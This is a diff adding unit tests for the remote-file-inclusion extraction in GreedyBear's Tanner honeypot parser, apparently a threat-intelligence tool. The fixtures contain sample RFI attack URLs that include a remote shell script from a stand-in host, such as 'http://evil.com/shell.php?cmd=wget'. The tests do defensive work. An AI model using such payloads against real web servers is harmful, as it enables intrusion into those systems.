@@ -431,6 +431,112 @@ class TestTannerRfiExtraction(ExtractionTestCase):
         ioc_arg = payload_calls[0][0][0]
         self.assertEqual(ioc_arg._sensors_to_add, [mock_sensor])
 
+    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
+    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
+    def test_rfi_outer_param_stripped_from_url(self, mock_tag_objects, mock_iocs_from_hits):
+        """URL without a query string: '&' is an outer request separator and must be stripped."""
+        mock_iocs_from_hits.return_value = []
+        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
+        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
+        mock_tag_objects.get_or_create.return_value = (Mock(), True)
+
+        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
+        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)
+
+        # The '&b=next' after the path has no preceding '?', so it is an outer param
+        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=http://evil.com/shell.php&b=next"}]
+        self.strategy.extract_from_hits(hits)
+
+        payload_calls = [c for c in self.strategy.ioc_processor.add_ioc.call_args_list if c[1].get("attack_type") == PAYLOAD_REQUEST]
+        self.assertEqual(len(payload_calls), 1)
+        submitted_url = payload_calls[0][0][0].related_urls[0]
+        self.assertEqual(submitted_url, "http://evil.com/shell.php")
+
+    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
+    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
+    def test_rfi_query_string_params_preserved(self, mock_tag_objects, mock_iocs_from_hits):
+        """URL with a real query string: '&' within the query must NOT be stripped."""
+        mock_iocs_from_hits.return_value = []
+        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
+        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
+        mock_tag_objects.get_or_create.return_value = (Mock(), True)
+
+        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
+        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)
+
+        full_url = "http://evil.com/shell.php?cmd=wget&host=10.0.0.1"
+        hits = [{"src_ip": "1.2.3.4", "url": f"/page?file={full_url}"}]
+        self.strategy.extract_from_hits(hits)
+
+        payload_calls = [c for c in self.strategy.ioc_processor.add_ioc.call_args_list if c[1].get("attack_type") == PAYLOAD_REQUEST]
+        self.assertEqual(len(payload_calls), 1)
+        submitted_url = payload_calls[0][0][0].related_urls[0]
+        self.assertEqual(submitted_url, full_url)
+
+    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
+    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
+    def test_rfi_trailing_delimiters_stripped_from_url(self, mock_tag_objects, mock_iocs_from_hits):
+        """Trailing ')', ',', ';' characters must be stripped from extracted URLs."""
+        mock_iocs_from_hits.return_value = []
+        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
+        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
+        mock_tag_objects.get_or_create.return_value = (Mock(), True)
+
+        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
+        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)
+
+        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=http://evil.com/shell.php),;"}]
+        self.strategy.extract_from_hits(hits)
+
+        payload_calls = [c for c in self.strategy.ioc_processor.add_ioc.call_args_list if c[1].get("attack_type") == PAYLOAD_REQUEST]
+        self.assertEqual(len(payload_calls), 1)
+        submitted_url = payload_calls[0][0][0].related_urls[0]
+        self.assertEqual(submitted_url, "http://evil.com/shell.php")
+
+    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
+    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
+    def test_rfi_timestamp_set_on_ioc(self, mock_tag_objects, mock_iocs_from_hits):
+        """first_seen and last_seen on the RFI IOC must match the hit's @timestamp."""
+        mock_iocs_from_hits.return_value = []
+        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
+        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
+        mock_tag_objects.get_or_create.return_value = (Mock(), True)
+
+        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
+        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)
+
+        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=http://evil.com/shell.php", "@timestamp": "2025-06-01T12:00:00"}]
+        self.strategy.extract_from_hits(hits)
+
+        payload_calls = [c for c in self.strategy.ioc_processor.add_ioc.call_args_list if c[1].get("attack_type") == PAYLOAD_REQUEST]
+        self.assertEqual(len(payload_calls), 1)
+        ioc_arg = payload_calls[0][0][0]
+        from datetime import datetime
+
+        expected_time = datetime.fromisoformat("2025-06-01T12:00:00")
+        self.assertEqual(ioc_arg.first_seen, expected_time)
+        self.assertEqual(ioc_arg.last_seen, expected_time)
+
+    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
+    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
+    def test_rfi_missing_timestamp_no_crash(self, mock_tag_objects, mock_iocs_from_hits):
+        """Missing @timestamp must not crash; IOC is still created without explicit timestamps."""
+        mock_iocs_from_hits.return_value = []
+        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
+        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
+        mock_tag_objects.get_or_create.return_value = (Mock(), True)
+
+        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
+        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)
+
+        # No @timestamp key
+        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=http://evil.com/shell.php"}]
+        self.strategy.extract_from_hits(hits)
+
+        # Just verify no crash and IOC was still submitted
+        payload_calls = [c for c in self.strategy.ioc_processor.add_ioc.call_args_list if c[1].get("attack_type") == PAYLOAD_REQUEST]
+        self.assertEqual(len(payload_calls), 1)
+
 
 class TestTannerAddFks(ExtractionTestCase):
     def setUp(self):
